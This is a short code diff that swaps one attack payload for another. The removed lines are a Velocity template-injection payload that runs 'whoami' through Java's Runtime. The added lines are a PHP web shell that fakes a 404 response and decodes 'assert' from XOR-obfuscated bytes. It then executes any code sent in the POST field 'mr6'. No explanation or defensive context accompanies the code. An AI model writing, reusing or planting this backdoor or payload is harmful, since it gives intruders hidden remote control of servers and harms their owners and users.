@@ -1,6 +1,18 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami'))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$out.read()
-#end
+<?php 
+header('HTTP/1.1 404');
+class IPVX { 
+    public $c='';
+    function __destruct() {
+        $_0 = "\x2d" ^ "\x4c";
+        $_1 = "\x3" ^ "\x70";
+        $_2 = "\x8" ^ "\x7b";
+        $_3 = "\x76" ^ "\x13";
+        $_4 = "\x44" ^ "\x36";
+        $_5 = "\x1c" ^ "\x68";
+        $db =$_0.$_1.$_2.$_3.$_4.$_5;
+        return @$db($this->c);
+    }
+}
+$ipvx = new IPVX();
+@$ipvx->c = $_POST['mr6'];
+?>
